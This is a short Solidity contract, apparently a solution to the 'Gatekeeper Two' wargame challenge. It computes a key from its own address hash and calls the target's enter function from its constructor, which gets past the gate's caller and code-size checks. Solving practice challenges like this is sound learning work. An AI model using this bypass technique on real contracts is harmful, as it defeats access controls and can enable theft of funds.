pragma solidity ^0.6.0;

contract GatekeeperTwoAttack {

    constructor(address gate) public {
        bytes8 key = 
            bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
            (uint64(0) - 1));
            
            gate.call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}
